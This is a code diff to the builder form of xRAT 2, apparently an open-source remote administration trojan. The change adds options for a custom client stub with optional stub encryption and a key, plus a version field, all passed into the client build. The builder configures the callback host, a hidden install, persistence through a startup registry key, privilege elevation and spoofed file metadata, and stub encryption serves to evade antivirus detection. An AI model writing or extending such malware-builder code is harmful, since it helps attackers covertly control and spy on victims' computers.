@@ -9,9 +9,11 @@ namespace xRAT_2.Forms
 {
     public partial class frmBuilder : Form
     {
-        public frmBuilder()
+        private string profilepath;
+        public frmBuilder(string pathtoprofile)
         {
             InitializeComponent();
+            profilepath = pathtoprofile;
         }
 
         private void LoadProfile(string profilename)
@@ -42,6 +44,12 @@ namespace xRAT_2.Forms
             txtOriginalFilename.Text = pm.ReadValue("OriginalFilename");
             txtProductVersion.Text = pm.ReadValue("ProductVersion");
             txtFileVersion.Text = pm.ReadValue("FileVersion");
+
+            chkCustomStub.Checked = bool.Parse(pm.ReadValue("CheckedStubModifying"));
+            txtStubPath.Text = pm.ReadValue("StubPath");
+            chkStubEncryption.Checked = bool.Parse(pm.ReadValue("CheckedStubEncryption"));
+            txtStubKey.Text = pm.ReadValue("StubKey");
+            txtVersion.Text = pm.ReadValue("VersionName");
         }
 
         private void SaveProfile(string profilename)
@@ -70,11 +78,17 @@ namespace xRAT_2.Forms
             pm.WriteValue("OriginalFilename", txtOriginalFilename.Text);
             pm.WriteValue("ProductVersion", txtProductVersion.Text);
             pm.WriteValue("FileVersion", txtFileVersion.Text);
+
+            pm.WriteValue("CheckedStubModifying", chkCustomStub.Checked.ToString());
+            pm.WriteValue("StubPath", txtStubPath.Text);
+            pm.WriteValue("CheckedStubEncryption", chkStubEncryption.Checked.ToString());
+            pm.WriteValue("StubKey", txtStubKey.Text);
+            pm.WriteValue("VersionName", txtVersion.Text);
         }
 
         private void frmBuilder_Load(object sender, EventArgs e)
         {
-            LoadProfile("Default");
+            LoadProfile(System.IO.Path.GetFileNameWithoutExtension(profilepath));
             if (string.IsNullOrEmpty(txtMutex.Text))
             {
                 txtPort.Text = XMLSettings.ListenPort.ToString();
@@ -93,6 +107,7 @@ namespace xRAT_2.Forms
             txtRegistryKeyName.Enabled = (chkInstall.Checked && chkStartup.Checked);
 
             ToggleAsmInfoControls();
+            ToggleCstmStubControls();
         }
 
         private void frmBuilder_FormClosing(object sender, FormClosingEventArgs e)
@@ -204,7 +219,7 @@ namespace xRAT_2.Forms
 
         private void btnBuild_Click(object sender, EventArgs e)
         {
-            if (!string.IsNullOrEmpty(txtHost.Text) && !string.IsNullOrEmpty(txtPort.Text) && !string.IsNullOrEmpty(txtDelay.Text) && !string.IsNullOrEmpty(txtPassword.Text) && !string.IsNullOrEmpty(txtMutex.Text))
+            if (!string.IsNullOrEmpty(txtHost.Text) && !string.IsNullOrEmpty(txtPort.Text) && !string.IsNullOrEmpty(txtDelay.Text) && !string.IsNullOrEmpty(txtPassword.Text) && !string.IsNullOrEmpty(txtMutex.Text) && !string.IsNullOrEmpty(txtVersion.Text))
             {
                 if (!chkInstall.Checked || (chkInstall.Checked && !string.IsNullOrEmpty(txtInstallname.Text) && !string.IsNullOrEmpty(txtInstallsub.Text)))
                 {
@@ -255,7 +270,7 @@ namespace xRAT_2.Forms
                                     asmInfo[6] = txtProductVersion.Text;
                                     asmInfo[7] = txtFileVersion.Text;
                                 }
-                                ClientBuilder.Build(output, txtHost.Text, txtPassword.Text, txtInstallsub.Text, txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked, chkStartup.Checked, chkHide.Checked, int.Parse(txtPort.Text), int.Parse(txtDelay.Text), GetInstallpath(), chkElevation.Checked, icon, asmInfo);
+                                ClientBuilder.Build(output, txtHost.Text, txtPassword.Text, txtInstallsub.Text, txtInstallname.Text + ".exe", txtMutex.Text, txtRegistryKeyName.Text, chkInstall.Checked, chkStartup.Checked, chkHide.Checked, int.Parse(txtPort.Text), int.Parse(txtDelay.Text), GetInstallpath(), chkElevation.Checked, icon, txtVersion.Text, asmInfo, txtStubPath.Text, txtStubKey.Text);
                                 MessageBox.Show("Successfully built client!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                             }
                             catch (Exception ex)
@@ -319,6 +334,64 @@ namespace xRAT_2.Forms
         {
             Match match = Regex.Match(input, @"^[0-9]+\.[0-9]+\.(\*|[0-9]+)\.(\*|[0-9]+)$", RegexOptions.IgnoreCase);
             return match.Success;
+        }
+
+        private void chkCustomStub_CheckedChanged(object sender, EventArgs e)
+        {
+            ToggleCstmStubControls();
+        }
+        private void ToggleCstmStubControls()
+        {
+            this.Invoke((MethodInvoker)delegate
+            {
+                foreach (Control ctrl in groupStub.Controls)
+                {
+                    if (ctrl is Label)
+                    {
+                        if (!(((Label)ctrl).Name == "lblStubKey"))
+                            ((Label)ctrl).Enabled = chkCustomStub.Checked;
+                    }
+                    else if (ctrl is TextBox)
+                    {
+                        if (!(((TextBox)ctrl).Name == "txtStubKey"))
+                            ((TextBox)ctrl).Enabled = chkCustomStub.Checked;
+                    }
+                    else if (ctrl is Button)
+                    {
+                        ((Button)ctrl).Enabled = chkCustomStub.Checked;
+                    }
+                    else if (ctrl is CheckBox)
+                    {
+                        if (((CheckBox)ctrl).Name == "chkStubEncryption")
+                        {
+                            ((CheckBox)ctrl).Enabled = chkCustomStub.Checked;
+                            if (chkCustomStub.Checked == false)
+                            {
+                                ((CheckBox)ctrl).Checked = chkCustomStub.Checked;
+                                txtStubKey.Enabled = chkCustomStub.Checked;
+                                lblStubKey.Enabled = chkCustomStub.Checked;
+                            }
+                        }
+                    }
+                }
+            });
+        }
+
+        private void btnCstmStubFilePath_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog ofd = new OpenFileDialog())
+            {
+                ofd.Filter = "Stub File *.bin|*.bin";
+                ofd.Multiselect = false;
+                if (ofd.ShowDialog() == DialogResult.OK)
+                    txtStubPath.Text = ofd.FileName;
+            }
+        }
+
+        private void chkStubEncryption_CheckedChanged(object sender, EventArgs e)
+        {
+            lblStubKey.Enabled = chkStubEncryption.Checked;
+            txtStubKey.Enabled = chkStubEncryption.Checked;
         }
     }
 }
